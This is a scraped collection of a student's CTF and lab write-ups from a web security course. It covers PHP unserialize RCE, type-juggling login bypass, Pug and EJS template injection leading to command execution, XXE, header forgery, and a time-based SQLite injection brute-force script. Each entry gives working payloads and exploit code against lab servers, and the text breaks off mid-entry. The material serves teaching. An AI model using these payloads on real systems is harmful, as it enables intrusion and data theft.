Web # Challenge: http://h4ck3r.quest:8602/\nBackground # None\u0026hellip;\nSource code # :::spoiler code\nisset($_GET[\u0026#39;source\u0026#39;]) \u0026amp;\u0026amp; die(!show_source(__FILE__)); class Magic { function cast($spell) { echo \u0026#34;\u0026lt;script\u0026gt;alert(\u0026#39;MAGIC, $spell!\u0026#39;);\u0026lt;/script\u0026gt;\u0026#34;; } } // Useless class? class Caster { public $cast_func = \u0026#39;intval\u0026#39;; function cast($val) { return ($this-\u0026gt;cast_func)($val); } } class Cat { public $magic; public $spell; function __construct($spell) { $this-\u0026gt;magic = new Magic(); $this-\u0026gt;spell = $spell; } function __wakeup() { echo \u0026#34;Cat Wakeup!\\n\u0026#34;; $this-\u0026gt;magic-\u0026gt;cast($this-\u0026gt;spell); } } if (isset($_GET[\u0026#39;spell\u0026#39;])) { $cat = new Cat($_GET[\u0026#39;spell\u0026#39;]); } else if (isset($_COOKIE[\u0026#39;cat\u0026#39;])) { echo \u0026#34;Unserialize...\\n\u0026#34;; $cat = unserialize(base64_decode($_COOKIE[\u0026#39;cat\u0026#39;])); } else { $cat = new Cat(\u0026#34;meow-meow-magic\u0026#34;); } ?\u0026gt; \u0026lt;pre\u0026gt; This is your 🐱: \u0026lt;?php var_dump($cat) ?\u0026gt; \u0026lt;/pre\u0026gt; \u0026lt;p\u0026gt;Usage:\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;/?source\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;/?spell=the-spell-of-your-cat\u0026lt;/p\u0026gt; :::\nDescription \u0026amp; Analyze # Exploit - unserialize # Test payload in local side\n$ ./psysh \u0026gt; class Caster . { . public $cast_func = \u0026#39;intval\u0026#39;; . function cast($val) . { . return ($this-\u0026gt;cast_func)($val); . } . } \u0026gt; $test = new Caster = Caster {#2772 +cast_func: \u0026#34;intval\u0026#34;, } \u0026gt; $test-\u0026gt;cast_func = \u0026#39;system\u0026#39; = \u0026#34;system\u0026#34; \u0026gt; $test-\u0026gt;cast(\u0026#39;pwd\u0026#39;) = \u0026#34;/home/sbk6401\u0026#34; Construct serialized session\n\u0026gt; class Cat . { . public $magic; . public $spell; . function __construct($spell) . { . $this-\u0026gt;spell = $spell; . $this-\u0026gt;magic = new Caster(); . } . function __wakeup() . { . echo \u0026#34;Cat Wakeup!\\n\u0026#34;; . $this-\u0026gt;magic-\u0026gt;cast($this-\u0026gt;spell); . } . } \u0026gt; $cat = new Cat(\u0026#34;ls -al /\u0026#34;) = Cat {#2771 +magic: Caster {#2763 +cast_func: \u0026#34;intval\u0026#34;, }, +spell: \u0026#34;ls -al /\u0026#34;, } \u0026gt; $cat-\u0026gt;magic-\u0026gt;cast_func = \u0026#34;system\u0026#34; = \u0026#34;system\u0026#34; \u0026gt; base64_encode(serialize($cat)) = \u0026#34;TzozOiJDYXQiOjI6e3M6NToibWFnaWMiO086NjoiQ2FzdGVyIjoxOntzOjk6ImNhc3RfZnVuYyI7czo2OiJzeXN0ZW0iO31zOjU6InNwZWxsIjtzOjg6ImxzIC1hbCAvIjt9\u0026#34; Get flag\n\u0026gt; $cat-\u0026gt;spell = \u0026#34;cat /flag*\u0026#34; = \u0026#34;cat /flag*\u0026#34; \u0026gt; base64_encode(serialize($cat)) = \u0026#34;TzozOiJDYXQiOjI6e3M6NToibWFnaWMiO086NjoiQ2FzdGVyIjoxOntzOjk6ImNhc3RfZnVuYyI7czo2OiJzeXN0ZW0iO31zOjU6InNwZWxsIjtzOjEwOiJjYXQgL2ZsYWcqIjt9\u0026#34; Flag: FLAG{magic_cat_pwnpwn}\nReference # PHP物件導向的第一課：class 【第十九天 - PHP反序列化(1)】\n"},{"id":458,"href":"/security/course/ntust-ws/language-feature/simple-web-0x19lab---php-login/","title":"Simple Web 0x19(Lab - PHP Login)","section":"Securities","content":" Simple Web 0x19(Lab - PHP Login) # tags: NTUSTWS CTF Web # Challenge: http://h4ck3r.quest:8081\nBackground # Source code # \u0026lt;?php // BSides Ahmedabad CTF 2021: entrance include \u0026#39;flag.php\u0026#39;; $users = array( \u0026#34;admin\u0026#34; =\u0026gt; \u0026#34;ed2b7b57b3b5be3e8d4246c69e4b513608ffb352\u0026#34;, \u0026#34;guest\u0026#34; =\u0026gt; \u0026#34;35675e68f4b5af7b995d9205ad0fc43842f16450\u0026#34; ); function lookup($username) { global $users; return array_key_exists($username, $users) ? $users[$username] : \u0026#34;\u0026#34;; } if (!empty($_POST[\u0026#39;username\u0026#39;]) \u0026amp;\u0026amp; !empty($_POST[\u0026#39;password\u0026#39;])) { $sha1pass = lookup($_POST[\u0026#39;username\u0026#39;]); if ($sha1pass == sha1($_POST[\u0026#39;password\u0026#39;])) { if ($_POST[\u0026#39;username\u0026#39;] !== \u0026#39;guest\u0026#39;) echo $FLAG; else echo \u0026#39;Welcome guest!\u0026#39;; } else { echo \u0026#39;Login Failed!\u0026#39;; } } else { echo \u0026#34;You can login with guest:guest\u0026#34;; } echo \u0026#34;\u0026lt;br\u0026gt;\\n\u0026#34;; highlight_file(__file__); ?\u0026gt; Exploit # Must change GET method to POST method and add Content-Type: application/x-www-form-urlencoded in header\n通靈 Payload: username=123\u0026amp;password[]=123 Reference # bsides-ahmedabad-ctf-2021-writeups\n"},{"id":459,"href":"/security/course/ntust-ws/ssti/simple-web-0x22lab---pug/","title":"Simple Web 0x22(Lab - Pug)","section":"Securities","content":" Simple Web 0x22(Lab - Pug) # tags: NTUSTWS CTF Web # Challenge: http://h4ck3r.quest:8008\nSource code # :::spoiler\nconst express = require(\u0026#39;express\u0026#39;); const pug = require(\u0026#39;pug\u0026#39;); const app = express(); const template = ` h1 Hello %NAME% form(method=\u0026#39;GET\u0026#39; action=\u0026#39;/\u0026#39;) div label(for=\u0026#39;nickname\u0026#39;) Name: input#nickname(type=\u0026#39;text\u0026#39;, placeholder=\u0026#39;Nickname\u0026#39; name=\u0026#39;name\u0026#39;) button(type=\u0026#39;submit\u0026#39;) Submit a(href=\u0026#39;/source\u0026#39;) Source Code `; app.get(\u0026#39;/\u0026#39;, (req, res) =\u0026gt; { const name = (req.query.name ?? \u0026#39;Anonymous\u0026#39;).toString(); if (name.includes(\u0026#39;{\u0026#39;)) return res.send(\u0026#39;Nice try\u0026#39;); let html = pug.render(template.replace(\u0026#39;%NAME%\u0026#39;, name)); res.set(\u0026#39;Content-Type\u0026#39;, \u0026#39;text/html\u0026#39;); res.send(html); }); app.get(\u0026#34;/source\u0026#34;, (_, res) =\u0026gt; { res.sendFile(__filename); }); app.listen(3000, () =\u0026gt; console.log(\u0026#39;:3000\u0026#39;)); :::\nExploit - tqlmap # $ ./tplmap.py --engine pug --os-shell -u \u0026#34;http://h4ck3r.quest:8008/?name=bob\u0026#34; Using wireshark to trace the payload You must let the template by like: const template = ` h1 Hello %NAME% = global.process.mainModule.require(\u0026#39;child_process\u0026#39;).execSync(Buffer(\u0026#39;bHM=\u0026#39;, \u0026#39;base64\u0026#39;).toString()) form(method=\u0026#39;GET\u0026#39; action=\u0026#39;/\u0026#39;) div label(for=\u0026#39;nickname\u0026#39;) Name: input#nickname(type=\u0026#39;text\u0026#39;, placeholder=\u0026#39;Nickname\u0026#39; name=\u0026#39;name\u0026#39;) button(type=\u0026#39;submit\u0026#39;) Submit a(href=\u0026#39;/source\u0026#39;) Source Code `; Including a new line and an equal sign Payload: %0A%3D%20global.process.mainModule.require%28%27child_process%27%29.execSync%28Buffer%28%27bHM%3D%27%2C%2B%27base64%27%29.toString%28%29%29 which is = global.process.mainModule.require(\u0026#39;child_process\u0026#39;).execSync(Buffer(\u0026#39;bHM=\u0026#39;,+\u0026#39;base64\u0026#39;).toString()) Note that bHM= is command ls in base64 format Reference # 关于SSTI注入的二三事 【SSTI模块注入】SSTI+Flask+Python（下）：绕过过滤 0xdbe-appsec/ssti-express-pug Tplmap [Linux系統] Ubuntu 安裝 Node.js\n"},{"id":460,"href":"/security/course/ntu-cs/web/simple-web---0x14lab---xxe/","title":"Simple Web 0x23(Lab - XXE)","section":"Securities","content":" Simple Web 0x23(Lab - XXE) # tags: NTUSTWS CTF Web # Challenge: http://h4ck3r.quest:8604/\nBackground # XML Tree XML Parser AJAX - Server Response XML DTD\n输入流 php://input\nphp://input可以读取没有处理过的POST数据。\nDay 18：Stream 概述\nphp://input 取得所有的 input 通常來源於 HTTP body，值得注意的是，由這個 Stream 取得的內容是 Raw Body，所以需要自行解析。\n來自外部的威脅-XXE漏洞攻擊成因 :::spoiler XXE course lecture ::: :::spoiler exploit type :::\nSource code # \u0026lt;?php $xmlfile = urldecode(file_get_contents(\u0026#39;php://input\u0026#39;)); if (!$xmlfile) die(show_source(__FILE__)); $dom = new DOMDocument(); $dom-\u0026gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); $creds = simplexml_import_dom($dom); $user = $creds-\u0026gt;user; echo \u0026#34;You have logged in as user $user\u0026#34;; ?\u0026gt; Exploit - XXE # Normal Usage in this webpage Reference # "},{"id":461,"href":"/security/course/ntust-ws/deserialization/simple-web-0x23lab---xxe/","title":"Simple Web 0x23(Lab - XXE)","section":"Securities","content":" Simple Web 0x23(Lab - XXE) # tags: NTUSTWS CTF Web # Challenge: http://h4ck3r.quest:8604/\nBackground # XML Tree XML Parser AJAX - Server Response XML DTD\n输入流 php://input\nphp://input可以读取没有处理过的POST数据。\nDay 18：Stream 概述\nphp://input 取得所有的 input 通常來源於 HTTP body，值得注意的是，由這個 Stream 取得的內容是 Raw Body，所以需要自行解析。\n來自外部的威脅-XXE漏洞攻擊成因 :::spoiler XXE course lecture ::: :::spoiler exploit type :::\nSource code # \u0026lt;?php $xmlfile = urldecode(file_get_contents(\u0026#39;php://input\u0026#39;)); if (!$xmlfile) die(show_source(__FILE__)); $dom = new DOMDocument(); $dom-\u0026gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); $creds = simplexml_import_dom($dom); $user = $creds-\u0026gt;user; echo \u0026#34;You have logged in as user $user\u0026#34;; ?\u0026gt; Exploit - XXE # Normal Usage in this webpage Reference # "},{"id":462,"href":"/security/course/ntust-ws/beginner/simple-web-0x24lab---how2http/","title":"Simple Web 0x24(Lab - how2http)","section":"Securities","content":" Simple Web 0x24(Lab - how2http) # Source code # \u0026lt;?php show_source(__FILE__); include(\u0026#34;flag.php\u0026#34;); if (!empty($_SERVER[\u0026#34;HTTP_CLIENT_IP\u0026#34;])){ $ip = $_SERVER[\u0026#34;HTTP_CLIENT_IP\u0026#34;]; } elseif (!empty($_SERVER[\u0026#34;HTTP_X_FORWARDED_FOR\u0026#34;])){ $ip = $_SERVER[\u0026#34;HTTP_X_FORWARDED_FOR\u0026#34;]; } else { $ip = $_SERVER[\u0026#34;REMOTE_ADDR\u0026#34;]; } if ($_COOKIE[\u0026#39;user\u0026#39;] !== \u0026#39;admin\u0026#39;) die(\u0026#34;Not admim\u0026#34;); if( $_SERVER[\u0026#34;REQUEST_METHOD\u0026#34;] !== \u0026#34;FLAG\u0026#34; ) die(\u0026#34;u don\u0026#39;t need flag?\u0026#34;); if ($ip === \u0026#34;127.0.0.1\u0026#34;) echo $FLAG; else echo \u0026#34;NOPE!\u0026#34;; ?\u0026gt; Recon # 主要是參考之前寫過的PicoCTF - Who are you?和PicoCTF - Who are you?，按照source code我們需要更改一些header讓他可以被forge然後bypass這些條件，首先是IP，他其實給的很寬鬆，還有X-Forwarded-For的header可以用，就直接==X-Forwarded-For: 127.0.0.1==；另外，cookie的user要等於admin→==Cookie: user=admin==；再來，request method要等於FLAG→==FLAG / HTTP/1.1==\nExploit # Flag: FLAG{b4by_httttp!}\nReference # X-Forwarded-For\n"},{"id":463,"href":"/security/course/ntu-cs/web/simple-web---0x412023-hw---double-injection---flag1/","title":"Simple Web 0x41(2023 HW - Double Injection - FLAG1)","section":"Securities","content":" Simple Web 0x41(2023 HW - Double Injection - FLAG1) # Background # Time Based SQLi :::info 建議先在local side自架docker environment，debug比較方便；另外也推薦在local自架sqlite的環境，下語法或是debug也很方便 :::\nSource code # :::spoiler init-db.js\nconst fs = require(\u0026#39;fs\u0026#39;); const sqlite3 = require(\u0026#39;sqlite3\u0026#39;).verbose(); const FLAG1 = fs.readFileSync(\u0026#39;/flag1.txt\u0026#39;, \u0026#39;utf8\u0026#39;).trim(); const db = new sqlite3.Database(\u0026#39;/etc/db.sqlite3\u0026#39;); db.exec(` DROP TABLE IF EXISTS users; CREATE TABLE db ( users JSON NOT NULL ); INSERT INTO db(users) VALUES (\u0026#39;{ \u0026#34;admin\u0026#34;: { \u0026#34;username\u0026#34;: \u0026#34;admin\u0026#34;, \u0026#34;password\u0026#34;: \u0026#34;${FLAG1}\u0026#34; }, \u0026#34;guest\u0026#34;: { \u0026#34;username\u0026#34;: \u0026#34;guest\u0026#34;, \u0026#34;password\u0026#34;: \u0026#34;guest\u0026#34; } }\u0026#39;); `); ::: :::spoiler Dockerfile\nFROM node:alpine RUN mkdir -p /usr/src/app WORKDIR /usr/src/app COPY ./app . RUN yarn install RUN echo \u0026#39;FLAG{flag-1}\u0026#39; \u0026gt; /flag1.txt RUN echo \u0026#39;FLAG{flag-2}\u0026#39; \u0026gt; \u0026#34;/flag2-$(tr -dc \u0026#39;a-zA-Z0-9\u0026#39; \u0026lt; /dev/urandom | head -c 16).txt\u0026#34; RUN node ./init-db.js \u0026amp;\u0026amp; chmod 444 /etc/db.sqlite3 RUN adduser -D -h /home/ctf ctf RUN chown -R ctf:ctf /usr/src/app USER ctf CMD [ \u0026#34;node\u0026#34;, \u0026#34;app.js\u0026#34; ] ::: :::spoiler app.js\nconst express = require(\u0026#39;express\u0026#39;); const ejs = require(\u0026#39;ejs\u0026#39;); const sqlite3 = require(\u0026#39;sqlite3\u0026#39;).verbose(); const fs = require(\u0026#39;fs\u0026#39;); const FLAG1 = fs.readFileSync(\u0026#39;/flag1.txt\u0026#39;, \u0026#39;utf8\u0026#39;).trim(); const db = new sqlite3.Database(\u0026#39;/etc/db.sqlite3\u0026#39;); const app = express(); app.use(express.urlencoded({ extended: false })); app.get(\u0026#39;/\u0026#39;, (req, res) =\u0026gt; { res.send(` \u0026lt;form action=\u0026#34;/login\u0026#34; method=\u0026#34;POST\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;username\u0026#34; placeholder=\u0026#34;Username\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;password\u0026#34; name=\u0026#34;password\u0026#34; placeholder=\u0026#34;Password\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; value=\u0026#34;Login\u0026#34;\u0026gt; \u0026lt;/form\u0026gt;` ); }); app.post(\u0026#39;/login\u0026#39;, (req, res) =\u0026gt; { const { username, password } = req.body; const jsonPath = JSON.stringify(`$.${username}.password`); const query = `SELECT json_extract(users, ${jsonPath}) AS password FROM db`; // console.log(query); const template = ` \u0026lt;html\u0026gt;\u0026lt;head\u0026gt;\u0026lt;title\u0026gt;Success\u0026lt;/title\u0026gt;\u0026lt;/head\u0026gt;\u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;Success!\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;Logged in as ${username}\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt; ` db.get(query, (err, row) =\u0026gt; { if (res.headersSent) return; if (err) return res.status(500).send(\u0026#39;Internal Server Error\u0026#39; + err); // console.log(row); if (row.password === password) { if (password !== FLAG1) { const html = ejs.render(`\u0026lt;h1\u0026gt;Success!\u0026lt;/h1\u0026gt;`, { username }); return res.send(html); } else { const html = ejs.render(template, { username }); return res.send(html); } } else { return res.status(401).send(\u0026#39;Unauthorized\u0026#39;); } }); res.setTimeout(Math.random() * 50 + 10, () =\u0026gt; res.status(401).send(\u0026#39;Unauthorized\u0026#39;)); }); app.listen(3000, () =\u0026gt; console.log(\u0026#39;Listening on port 3000\u0026#39;)); :::\nRecon # 這一題超爆難，應該可以預見被splitline凌虐，先看Dockerfile寫了甚麼，安裝的前置作業結束以後，分別把FLAG1和FLAG2的內容丟到/flag1.txt,/flag2-{random string}.txt中，並且執行db的初始化，也就是把FLAG1當成admin的密碼，接著比較重要的一步是把存取db內容的file(/etc/db.sqlite3)的權限設定read-only，這個操作後續會說明重要的地方，最後就是執行app.js\n目標: 我們的目標是想辦法把FLAG1拿到手，但看了一圈app.js也沒有任何想法，雖然我知道username的地方有SQLinjection的洞，但重要的是如何把密碼送到前端給我們 一開始的想法: 送出post request後，會進到login route，並且db會對送來的username / password進行query，此時會發現有兩個if statement，當時我在想，只要滿足第一個if statement，他就會return並且render出原本的username，所以如果我可以創一個新的table或是insert原本的users table，並且把username設定成FLAG1，然後password設定已知，這樣的話就一定會進到第二個if statement，如此就算我不知道FLAG1是多少，他也會把username吐回來到前端 if (row.password === password) { if (password !== FLAG1) { const html = ejs.render(`\u0026lt;h1\u0026gt;Success!\u0026lt;/h1\u0026gt;`, { username }); return res.send(html); } else { const html = ejs.render(template, { username }); return res.send(html); } } else { return res.status(401).send(\u0026#39;Unauthorized\u0026#39;); } 但這個做法有兩個原因導致無法實踐 前面講過，splitline把/etc/db.sqlite3設定成read-only，所以我們無法對他做任何修改 就算這個file可以修改，因為ejs.render的關係，如果給定的1st參數沒有format可以填入(就像第二個if出現的template)，他並不會把username一起render進去，雖然我也不確定為甚麼要這樣寫 比較可行的方式 逛了好幾圈app.js都沒有任何可以把username吐回前端的地方，代表這個思路應該不是可行的方式，此時可以想想看time based或是boolean based 這種blind injection，可能是個不錯的方式，雖然我也有嘗試union based，不過效果不大 因為是完全沒有任何filter的sql injection，所以我就直接在local的sqlite db browser下語法順便debug，當payload如下時: admin.username\u0026#34;) as a, json_extract(users, \u0026#39;$.admin.username\u0026#39;) as b, json_extract(users, \u0026#39;$.admin.password\u0026#39;) as c FROM db -- # 在server端會變成 \u0026#34;$.admin.username\\\u0026#34;) as a, json_extract(users, \u0026#39;$.admin.username\u0026#39;) as b, json_extract(users, \u0026#39;$.admin.password\u0026#39;) as c FROM db -- # .password\u0026#34; 完整的query會變成 SELECT json_extract(users, \u0026#34;$.admin.username\\\u0026#34;) as a, json_extract(users, \u0026#39;$.admin.username\u0026#39;) as b, json_extract(users, \u0026#39;$.admin.password\u0026#39;) as c FROM db -- # .password\u0026#34;) AS password FROM db 則query到的data如下 { a: null, b: \u0026#39;admin\u0026#39;, c: \u0026#39;FLAG{flag-1}\u0026#39; } 第一個參數a為null是因為app.js中，我們的payload經過==JSON.stringify==，會在雙引號前加一個反斜線，這會導致query時，db不知道==$.admin.username==是甚麼東西，只有單引號沒有這個問題，但如果第一個query data不加上雙引號就會導致閉合不全而導致結果異常(如下) 所以我乾脆第一個參數就算了，重新利用後兩個參數要到username和password 有了這個可以幹嘛呢?我們可以下條件，當條件符合的時候做A，否則做B，而A和B是有一些差異，可能是時間長度或是網站是否crash為基準，這樣的話我們就可以知道下的條件是否正確，POC如下: 看長度\nSELECT json_extract(users, \u0026#39;$.admin.username\u0026#39;) as a, json_extract(users, \u0026#39;$.admin.username\u0026#39;) as b, json_extract(users, \u0026#39;$.admin.password\u0026#39;) as c FROM db WHERE b = \u0026#39;admin\u0026#39; AND IIF(length(c) = 10, (SELECT randomblob(1000000000 % 10) FROM sqlite_master WHERE 1 LIMIT 1), 1); -- # 在local測試時，FLAG1=FLAG{test}，也就是只有10個字，如果條件設定不符合時，就會query出東西，因為條件不符回傳1，如下圖 反之，就會query不出東西，也就是crash 如果想要知道某一個字元可以substr這個function\nSELECT json_extract(users, \u0026#39;$.admin.username\u0026#39;) as a, json_extract(users, \u0026#39;$.admin.username\u0026#39;) as b, json_extract(users, \u0026#39;$.admin.password\u0026#39;) as c FROM db WHERE b = \u0026#39;admin\u0026#39; AND IIF(substr(c, 1, 5) = \u0026#39;FLAG{\u0026#39;, (SELECT randomblob(1000000000 % 10) FROM sqlite_master WHERE 1 LIMIT 1), 1); -- # 此時就可以開寫script去server端爆破FLAG1 Exploit - Time Based SQLi # from requests import * from string import * strings = ascii_letters + digits + punctuation url = \u0026#34;http://10.113.184.121:10081/login\u0026#34; flag = \u0026#34;\u0026#34; for i in range(27): if i == 26: flag += \u0026#34;}\u0026#34; break else: for string in strings: payload = f\u0026#34;admin.username\\\u0026#34;) as a, json_extract(users, \u0026#39;$.admin.username\u0026#39;) as b, json_extract(users, \u0026#39;$.admin.password\u0026#39;) as c FROM db WHERE b = \u0026#39;admin\u0026#39; AND IIF(substr(c, 1, {i + 1}) = \u0026#39;{flag + string}\u0026#39;, (SELECT randomblob(1000000000 % 10) FROM sqlite_master WHERE 1 LIMIT 1), 1); -- # \u0026#34; # payload = \u0026#34;admin.username\\\u0026#34;) as a, json_extract(users, \u0026#39;$.admin.username\u0026#39;) as b, json_extract(users, \u0026#39;$.admin.password\u0026#39;) as c FROM db WHERE b = \u0026#39;admin\u0026#39; AND IIF(length(c) = 27, (SELECT randomblob(1000000000 % 10) FROM sqlite_master WHERE 1 LIMIT 1), 1); -- # \u0026#34; # print(payload) try: r = post(url=url, data={\u0026#34;username\u0026#34; : payload, \u0026#34;password\u0026#34; : \u0026#34;guest\u0026#34;}) except: flag += string print(flag) break print(flag) Flag: FLAG{sqlite_js0n_inject!on}\nReference # ChatGPT - SQL Syntax Questions ChatGPT - Timed Based Questions Overview of SQLite IIF() function\n"},{"id":464,"href":"/security/course/ntu-cs/web/simple-web---0x422023-hw---double-injection---flag2/","title":"Simple Web 0x42(2023 HW - Double Injection - FLAG2)","section":"Securities","content":" Simple Web 0x42(2023 HW - Double Injection - FLAG2) # Background # Node JS ejs SSTI\nSource code # 呈上題\nRecon # 這一題想了很久，因為我沒有跟影片，想說應該都是跟去年差不多或是在臺科的網頁安全一樣，但其實相關的payload就是在講義上，花了一整天寫的我be like: 基本上就是連接前一題的思緒，既然我們知道admin的password也就是FLAG1，那麼我們就可以用前一題的payload:\nadmin.password\u0026#34;) as password, json_extract(users, \u0026#39;$.admin.password\u0026#39;) as password from db; -- # 後面搭配簡單的XSS也是可以通的，原本想說可以利用XSS達到RCE，但就我之前和Kaibro的詢問，XSS應該沒有這麼powerful，所以我就往SSTI或command injection下手，後來經過@cs-otaku的提點才知道ejs有一個洞，也是上課有提到的SSTI控到RCE，當時看的文章是Huli大寫的，內容詳細說明了為甚麼會有這個洞以及該如何構造攻擊的payload，不過整體更複雜也算是需要客製化的題目才需要了解這麼多，這一題算是只要取得經典的payload就可以攻克，如果想要用動態看他跑得怎麼樣，可以用web storm跟，想知道整體的動態流程可以看之前寫的文章\nExploit - Ejs SSTI RCE # Payload 1: Username: admin.password\u0026#34;) as password, json_extract(users, \u0026#39;$.admin.password\u0026#39;) as password from db; -- # \u0026lt;%= global.process.mainModule.require(\u0026#34;child_process\u0026#34;).execSync(\u0026#34;ls -al /\u0026#34;).toString() %\u0026gt; Password: FLAG{sqlite_js0n_inject!on} Result: total\t76\tdrwxr-xr-x\t1\troot\troot\t4096\tDec\t18\t18:54\t.\tdrwxr-xr-x\t1\troot\troot\t4096\tDec\t18\t18:54\t..\t-rwxr-xr-x\t1\troot\troot\t0\tDec\t18\t18:54\t.dockerenv\tdrwxr-xr-x\t1\troot\troot\t4096\tDec\t11\t18:36\tbin\tdrwxr-xr-x\t5\troot\troot\t340\tDec\t18\t18:54\tdev\tdrwxr-xr-x\t1\troot\troot\t4096\tDec\t18\t18:54\tetc\t-rw-r--r--\t1\troot\troot\t28\tDec\t18\t17:15\tflag1.txt\t-rw-r--r--\t1\troot\troot\t23\tDec\t18\t17:15\tflag2-1PRmDsTXoo3uPCdq.txt\tdrwxr-xr-x\t1\troot\troot\t4096\tDec\t18\t17:15\thome\tdrwxr-xr-x\t1\troot\troot\t4096\tDec\t11\t18:36\tlib\tdrwxr-xr-x\t5\troot\troot\t4096\tDec\t7\t09:43\tmedia\tdrwxr-xr-x\t2\troot\troot\t4096\tDec\t7\t09:43\tmnt\tdrwxr-xr-x\t1\troot\troot\t4096\tDec\t11\t18:36\topt\tdr-xr-xr-x\t497\troot\troot\t0\tDec\t18\t18:54\tproc\tdrwx------\t1\troot\troot\t4096\tDec\t11\t18:36\troot\tdrwxr-xr-x\t2\troot\troot\t4096\tDec\t7\t09:43\trun\tdrwxr-xr-x\t2\troot\troot\t4096\tDec\t7\t09:43\tsbin\tdrwxr-xr-x\t2\troot\troot\t4096\tDec\t7\t09:43\tsrv\tdr-xr-xr-x\t13\troot\troot\t0\tDec\t18\t18:54\tsys\tdrwxrwxrwt\t1\troot\troot\t4096\tDec\t22\t17:16\ttmp\tdrwxr-xr-x\t1\troot\troot\t4096\tDec\t18\t13:27\tusr\tdrwxr-xr-x\t12\troot\troot\t4096\tDec\t7\t09:43\tvar\tPayload 2: Username: admin.password\u0026#34;) as password, json_extract(users, \u0026#39;$.admin.password\u0026#39;) as password from db; -- # \u0026lt;%= global.process.mainModule.require(\u0026#34;child_process\u0026#34;).execSync(\u0026#34;cat /flag2-1PRmDsTXoo3uPCdq.txt\u0026#34;).toString() %\u0026gt; Password: FLAG{sqlite_js0n_inject!on} Result: FLAG{ezzzzz_sqli2ssti} Flag: FLAG{ezzzzz_sqli2ssti}\n補充: How to debug it? # 這邊示範如何用vscode debug這個project\n可以先看這個文章準備一些前置作業 在文章中有提到，docker幫忙做的事情，現在要自己完成 $ sudo touch /flag1.txt ; sudo chmod 777 /flag1.txt ; sudo echo \u0026#34;test\u0026#34; \u0026gt; /flag1.txt $ sudo node init-db.js ; sudo chmod 444 /etc/db.sqlite3 接著就可以開始debug app.js了 Reference # CTF 中的 EJS 漏洞筆記 AIS3-EOF-CTF-2019-Quals - echo WP ejs RCE CVE-2022-29078 bypass\n"},{"id":465,"href":"/security/course/ntu-cs/welcome/simple-welcome---0x04lab---script/","title":"Simple Welcome - 0x04(Lab - Script)","section":"Securities","content":" Simple Welcome - 0x04(Lab - Script) # tags: CTF Web eductf # Challenge: https://pyscript.ctf.zoolab.org/\nSource Code # \u0026lt;?php if(!isset($_FILES[\u0026#34;file\u0026#34;])) highlight_file(__file__) \u0026amp;\u0026amp; die(); $flag = file_get_contents(\u0026#39;/flag\u0026#39;); $node = @`node {$_FILES[\u0026#34;file\u0026#34;][\u0026#34;tmp_name\u0026#34;]} 2\u0026gt;\u0026amp;1`; $python = @`python3 {$_FILES[\u0026#34;file\u0026#34;][\u0026#34;tmp_name\u0026#34;]} 2\u0026gt;\u0026amp;1`; if($flag === $node \u0026amp;\u0026amp; $flag === $python) echo \u0026#39;Here is your Flag: \u0026#39;.$flag; else echo \u0026#39;Fail :(\u0026#39;; ?\u0026gt; Analysis # Must write a script that can be executed in python and node language simultaneously.\nExploit - Using comment # In python The comment is # for single line and ''' for multi lines In node The comment is // for single line and /**/ for multi lines Using different definition of comment to write script Some tips: a = 1 // 1; b = \u0026#39;\u0026#39;\u0026#39;\u0026#39;\u0026#39;\u0026#39; Both of these instruction are valid in python Whole payload Python\na = 1 // 1 ; b = \u0026#39;\u0026#39;\u0026#39; console.log(\u0026#39;Javascript code here\u0026#39;); /* \u0026#39;\u0026#39;\u0026#39; print(\u0026#39;Python code here\u0026#39;) # */ Javascript\na = 1 // 1 ; b = \u0026#39;\u0026#39;\u0026#39; console.log(\u0026#39;Javascript code here\u0026#39;); /* \u0026#39;\u0026#39;\u0026#39; print(\u0026#39;Python code here\u0026#39;) # */ Whole exploit\na = 1 // 1 ; b = \u0026#39;\u0026#39;\u0026#39; const fs = require(\u0026#39;fs\u0026#39;); fs.readFile(\u0026#34;/flag\u0026#34;, \u0026#39;utf8\u0026#39;,(error, data) =\u0026gt; { if (error) { console.error(error); return; } console.log(data.split(\u0026#39;\\n\u0026#39;)[0]); }) /* \u0026#39;\u0026#39;\u0026#39; f = open(\u0026#34;/flag\u0026#34;, \u0026#34;r\u0026#34;) print(f.read().split(\u0026#39;\\n\u0026#39;)[0]) # */ Reference # 【已解决】PHP中函数前面加上at符号@的作用 [shell 2\u0026gt;\u0026amp;1是甚麼意思] How to open a local file with JavaScript? How to Read/Write local files with Node.js String.prototype.split()\n"},{"id":466,"href":"/security/course/ntu-cs/welcome/simple-welcome-0x01lab---lets-meet-at-class/","title":"Simple Welcome 0x01(Lab - Let's meet at class)","section":"Securities","content":" Simple Welcome 0x01(Lab - Let\u0026rsquo;s meet at class) # Description # Crypto part of homework 0. The key space is $10^{15}$. I used my supercomputer(i5 7th gen) to solve it in about 10 minutes. It\u0026rsquo;s impossible for you guys to enumerate all the keys in 2 weeks, or maybe you can\u0026hellip; (Use pip3 install pycryptodome to install Crypto)\nSource Code # :::spoiler Source\nfrom Crypto.Util.number import bytes_to_long, getPrime import random import math import os from secret import FLAG FLAG += os.urandom(128 - len(FLAG)) flag = bytes_to_long(FLAG) p = getPrime(1024) keys = [pow(random.randint(1000 * i + 2, 1000 * (i+1) ), 65537, p) for i in range(5)] enc = flag for i in range(5): enc = enc * keys[i] % p hint = keys[0] ^ keys[1] ^ keys[2] ^ keys[3] ^ keys[4] print(\u0026#39;p =\u0026#39;, p) print(\u0026#39;enc =\u0026#39;, enc) print(\u0026#39;hint =\u0026#39;, hint) ::: :::spoiler\np = 92017932396773207330365205210913184771249549355771692523246399384571269833668487945963934319507538171501041280674304304879328757539798699280378034748542218248740777575679398093116579809607067129824965250071416089841516538588253944223235904445546895574651603636188746948921937704060334290364304972412697492577 enc = 87051682992840829567429886737255563980229964191963649650455667117285375334750716083826527488071966389632402954644144719710970265754062176648776448421065665281172133368294041777397049228273163978348132440822019295870429065335674151133125629968366491582233750452365390672536361224322642295053741696809519283644 hint = 